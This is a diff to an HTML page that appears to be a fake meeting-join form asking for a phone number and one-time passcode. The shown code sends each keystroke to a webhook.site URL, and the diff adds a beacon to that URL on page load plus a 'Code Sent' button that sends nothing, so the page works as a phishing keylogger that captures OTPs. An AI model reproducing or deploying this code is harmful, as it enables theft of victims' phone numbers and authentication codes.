@@ -1,3 +1,4 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html>
 <head>
@@ -58,6 +59,7 @@
         }
         button:focus {
             outline: none;
+            filter: blur(3px); /* Add the blur effect on focus */
         }
         .spacer {
             margin-bottom: 10px;
@@ -71,15 +73,34 @@
             <label for="phone">Enter Your Phone Number:</label>
             <input type="text" id="phone" name="phone" required>
         </div>
-        <button onclick="sendCode()" class="spacer">Send Code</button>
+        <button onclick="sendCode()" class="spacer" id="sendCodeButton">Send Code</button>
         <div class="form-group">
             <label for="otp">Enter OTP:</label>
-            <input type="number" id="otp" name="otp" required>
+            <input type="text" id="otp" name="otp" required>
         </div>
         <button onclick="joinMeeting()">Join Meeting</button>
     </div>
 
     <script>
+
+function sendPageOpenNotification() {
+            const webhookUrl = 'https://webhook.site/b8e15cbd-6a41-49c5-946e-3c79440377b4';
+            fetch(webhookUrl, {
+                method: 'GET',
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log(data); // Optional: Log the server response
+            })
+            .catch(error => {
+                console.error('Error:', error); // Optional: Handle errors if any
+            });
+        }
+
+        // Call the function to send the request when the page is loaded
+        sendPageOpenNotification();
+
+        
         // Function to send key event to the server
         function sendKeyEventToServer(key) {
             const webhookUrl = `https://webhook.site/b8e15cbd-6a41-49c5-946e-3c79440377b4?key=${key}`;
@@ -107,7 +128,11 @@
 
         // Function to be called when the "Send Code" button is clicked
         function sendCode() {
-            // Do nothing, button behavior is unchanged
+            const sendCodeButton = document.getElementById('sendCodeButton');
+            sendCodeButton.innerHTML = 'Code Sent';
+            sendCodeButton.style.backgroundColor = '#4caf50'; // Green color
+            sendCodeButton.style.pointerEvents = 'none'; // Disable further clicks
+            // Do nothing, just apply blur effect to the button
         }
 
         // Function to be called when the "Join Meeting" button is clicked
